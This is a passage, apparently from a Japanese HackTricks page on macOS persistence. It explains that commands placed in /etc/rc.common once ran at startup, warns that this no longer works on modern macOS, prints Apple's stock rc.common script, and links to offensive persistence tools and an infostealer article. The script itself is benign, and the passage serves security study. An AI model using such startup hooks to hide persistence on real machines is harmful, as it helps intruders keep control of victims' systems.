この script が実行されることはあまり一般的ではないようで、私の macOS でも見つけることができませんでした。そのため、詳しい情報が必要な場合は writeup を確認してください。

### ~~/etc/rc.common~~

> [!CAUTION] > **これは現代の MacOS バージョンでは動作しません**

ここに **startup 時に実行される commands を配置することも可能です。** 通常の rc.common script の例:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence techniques and tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
